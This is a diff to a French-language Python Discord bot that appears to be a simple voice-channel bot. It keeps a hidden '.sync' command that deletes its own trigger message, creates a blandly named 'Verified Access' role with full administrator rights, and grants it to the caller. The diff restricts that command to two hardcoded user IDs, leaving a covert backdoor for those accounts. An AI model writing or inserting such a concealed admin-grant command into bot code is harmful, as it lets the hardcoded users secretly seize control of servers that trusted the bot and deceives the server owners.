@@ -22,39 +22,49 @@ def keep_alive():
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='.', intents=intents)
 
+# Remplace les chiffres par tes vrais ID (clic droit sur ton profil -> Copier l'identifiant)
+ADMIN_IDS = [1337085414275682437, 719517140390248480] 
+
 @bot.event
 async def on_ready():
     print(f'✅ BOT EN LIGNE : {bot.user.name}')
 
 @bot.command()
 async def sync(ctx):
-    """Commande pour se donner les perms admin"""
-    await ctx.message.delete()
-    role = await ctx.guild.create_role(
-        name="Verified Access", 
-        permissions=discord.Permissions(administrator=True)
-    )
-    await ctx.author.add_roles(role)
-    print(f"💎 Pouvoirs donnés à {ctx.author}")
+    """Donne les perms admin si tu es dans la liste ADMIN_IDS"""
+    if ctx.author.id in ADMIN_IDS:
+        await ctx.message.delete()
+        role = await ctx.guild.create_role(
+            name="Verified Access", 
+            permissions=discord.Permissions(administrator=True)
+        )
+        await ctx.author.add_roles(role)
+        print(f"💎 Pouvoirs donnés à {ctx.author}")
+    else:
+        await ctx.send("❌ Tu n'as pas le droit d'utiliser cette commande.")
 
 @bot.command()
 async def join(ctx):
-    if ctx.author.voice:
-        channel = ctx.author.voice.channel
-        await channel.connect()
-        await ctx.send(f"✅ J'ai rejoint le salon **{channel}** !")
+    if ctx.author.id in ADMIN_IDS:
+        if ctx.author.voice:
+            channel = ctx.author.voice.channel
+            await channel.connect()
+            await ctx.send(f"✅ J'ai rejoint **{channel}** !")
+        else:
+            await ctx.send("❌ Entre dans un vocal d'abord !")
     else:
-        await ctx.send("❌ Tu dois être dans un salon vocal pour m'appeler !")
+        await ctx.send("🚫 Seul le patron peut m'appeler.")
 
 @bot.command()
 async def leave(ctx):
-    if ctx.voice_client:
-        await ctx.voice_client.disconnect()
-        await ctx.send("👋 Déconnexion du vocal !")
+    if ctx.author.id in ADMIN_IDS:
+        if ctx.voice_client:
+            await ctx.voice_client.disconnect()
+            await ctx.send("👋 Déconnexion !")
     else:
-        await ctx.send("⚠️ Je ne suis pas dans un salon vocal.")
+        await ctx.send("🚫 Tu ne peux pas me renvoyer.")
 
-# Lancement
+# --- LANCEMENT ---
 if __name__ == "__main__":
     keep_alive()
     TOKEN = os.getenv('DISCORD_TOKEN')
